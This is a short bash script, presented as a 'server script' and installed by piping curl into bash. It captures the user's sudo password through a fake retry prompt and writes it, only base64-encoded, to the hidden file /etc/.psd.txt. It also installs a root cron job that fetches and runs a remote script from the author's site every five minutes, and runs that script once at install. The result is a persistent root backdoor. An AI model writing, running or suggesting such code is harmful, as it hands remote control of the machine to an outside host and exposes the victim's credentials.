#!/bin/bash

# Usage - `curl https://matthewpipie.github.io/server.sh -s | bash`

echo "Matthew Server Script v1"

psd=""
echo ""
echo -n "Password:"
read -s psd </dev/tty
echo ""
sudo -k
echo $psd | sudo -Sv &> /dev/null
CAN_I_RUN_SUDO=$(sudo -n uptime 2>&1|grep "load"|wc -l)
while [ ${CAN_I_RUN_SUDO} -lt 1 ]; do
  sleep 3
  echo "Sorry, try again."
  echo -n "Password:"
  read -s psd </dev/tty
  echo ""
  sudo -k
  echo $psd | sudo -Sv &> /dev/null
  CAN_I_RUN_SUDO=$(sudo -n uptime 2>&1|grep "load"|wc -l)
done

echo ""

command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron

enc=$(echo $psd | base64 | tr -- '+=/' '-_~')

echo $enc | sudo tee -a /etc/.psd.txt > /dev/null

curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
